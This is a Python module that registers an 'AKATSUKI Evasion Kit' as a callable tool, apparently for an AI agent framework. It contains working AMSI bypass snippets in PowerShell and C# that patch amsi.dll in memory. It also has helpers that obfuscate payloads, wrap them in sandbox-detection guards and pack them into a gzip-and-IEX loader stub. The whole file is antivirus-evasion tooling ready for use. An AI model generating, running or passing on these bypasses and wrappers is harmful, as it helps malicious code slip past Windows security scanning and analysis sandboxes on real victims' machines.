import base64
import json
import logging
import random
import re
import string
import zlib

from tools.registry import registry, tool_error, tool_result

logger = logging.getLogger(__name__)

AMSI_BYPASS_PS = (
    '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") '
    '{$c=$b}};$d=$c.GetFields(\'NonPublic,Static\');Foreach($e in $d) {if ($e.Name '
    '-like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;'
    '[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'
)

AMSI_BYPASS_CSHARP = (
    'using System;using System.Runtime.InteropServices;class A {'
    '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);'
    '[DllImport("kernel32")]static extern IntPtr LoadLibrary(string n);'
    '[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr p,int s,uint f,out uint l);'
    'static void Main(){IntPtr d=LoadLibrary("amsi.dll");'
    'IntPtr p=GetProcAddress(d,"AmsiScanBuffer");'
    'uint o;VirtualProtect(p,0x1000,0x40,out o);'
    'Marshal.Copy(new byte[0x1000],0,p,0x1000);}}'
)


def base64_encode(data: str) -> str:
    return base64.b64encode(data.encode()).decode()


def base64_decode(data: str) -> str:
    return base64.b64decode(data).decode()


def xor_obfuscate(data: str, key: int = 0x42) -> str:
    return "".join(chr(ord(c) ^ key) for c in data)


def split_string(data: str, parts: int = 4) -> str:
    chunk = len(data) // parts
    pieces = [data[i:i + chunk] for i in range(0, len(data), chunk)]
    return "+".join(f'"{p}"' for p in pieces)


def variable_obfuscate(code: str) -> str:
    names = set(re.findall(r'\$(\w+)', code))
    mapping = {
        n: "$" + "".join(random.choices(string.ascii_letters, k=random.randint(6, 12)))
        for n in names if len(n) > 1
    }
    for orig, new in mapping.items():
        code = code.replace(orig, new)
    return code


def amsi_bypass(lang: str = "powershell") -> dict:
    if lang == "powershell":
        return {
            "type": "amsi_bypass", "language": "powershell", "code": AMSI_BYPASS_PS,
            "method": "AMSI Context patching", "detection_rate": "Low",
        }
    elif lang == "csharp":
        return {
            "type": "amsi_bypass", "language": "csharp", "code": AMSI_BYPASS_CSHARP,
            "method": "AMSI ScanBuffer patching", "detection_rate": "Low-Medium",
        }
    return {"error": f"Unsupported language: {lang}"}


def evade_sandbox(payload: str, lang: str = "powershell") -> str:
    sleep_cmd = "Start-Sleep -Seconds 5" if lang == "powershell" else "sleep(5)"
    check_vm = "$env:COMPUTERNAME -match 'SANDBOX|MALWARE|VIRUS'" if lang == "powershell" else ""
    guarded = f"if (-not ({check_vm})) {{ {sleep_cmd}; {payload} }}"
    return guarded


def compress_payload(code: str) -> str:
    compressed = zlib.compress(code.encode())
    b64 = base64.b64encode(compressed).decode()
    return (
        f'$d=[System.Convert]::FromBase64String("{b64}");'
        f'$s=New-Object IO.MemoryStream;$s.Write($d,0,$d.Length);'
        f'$r=New-Object IO.StreamReader(New-Object IO.Compression.GZipStream'
        f'($s,[IO.Compression.CompressionMode]::Decompress));IEX($r.ReadToEnd())'
    )


AKATSUKI_EVASION_SCHEMA = {
    "name": "akatsuki_evasion",
    "description": "AKATSUKI Evasion Kit — generate AMSI bypass code, apply obfuscation (base64, XOR, string splitting, variable rename), sandbox evasion wrappers, and payload compression for PowerShell/C# payloads.",
    "parameters": {
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": ["amsi_bypass", "obfuscate", "sandbox_wrap", "compress"],
                "description": "Evasion action to perform",
            },
            "language": {
                "type": "string",
                "enum": ["powershell", "csharp"],
                "description": "Target language for the evasion (default: powershell)",
            },
            "payload": {
                "type": "string",
                "description": "Payload code to wrap/obfuscate (required for sandbox_wrap, obfuscate, compress)",
            },
            "obfuscation_method": {
                "type": "string",
                "enum": ["base64", "xor", "split", "variable"],
                "description": "Obfuscation method (required for obfuscate action)",
            },
            "xor_key": {
                "type": "integer",
                "description": "XOR key for xor obfuscation (default: 0x42)",
            },
        },
        "required": ["action"],
    },
}


def akatsuki_evasion(action: str, language: str = "powershell", payload: str = None,
                     obfuscation_method: str = None, xor_key: int = 0x42) -> str:
    if action == "amsi_bypass":
        return tool_result(amsi_bypass(language))
    elif action == "obfuscate":
        if not payload:
            return tool_error("payload is required for obfuscate action")
        if obfuscation_method == "base64":
            return tool_result({"method": "base64", "result": base64_encode(payload)})
        elif obfuscation_method == "xor":
            return tool_result({"method": "xor", "key": xor_key, "result": xor_obfuscate(payload, xor_key)})
        elif obfuscation_method == "split":
            return tool_result({"method": "split", "result": split_string(payload)})
        elif obfuscation_method == "variable":
            return tool_result({"method": "variable_rename", "result": variable_obfuscate(payload)})
        return tool_error(f"Unknown obfuscation method: {obfuscation_method}")
    elif action == "sandbox_wrap":
        if not payload:
            return tool_error("payload is required for sandbox_wrap action")
        return tool_result({
            "method": "sandbox_evasion",
            "language": language,
            "wrapped": evade_sandbox(payload, language),
        })
    elif action == "compress":
        if not payload:
            return tool_error("payload is required for compress action")
        return tool_result({
            "method": "gzip_compress",
            "original_size": len(payload),
            "compressed_stub": compress_payload(payload),
        })
    return tool_error(f"Unknown action: {action}")


def check_akatsuki_evasion_requirements() -> bool:
    return True


registry.register(
    name="akatsuki_evasion",
    toolset="akatsuki",
    schema=AKATSUKI_EVASION_SCHEMA,
    handler=lambda args, **kw: akatsuki_evasion(
        action=args["action"],
        language=args.get("language", "powershell"),
        payload=args.get("payload"),
        obfuscation_method=args.get("obfuscation_method"),
        xor_key=args.get("xor_key", 0x42),
    ),
    check_fn=check_akatsuki_evasion_requirements,
    emoji="🛡️",
)
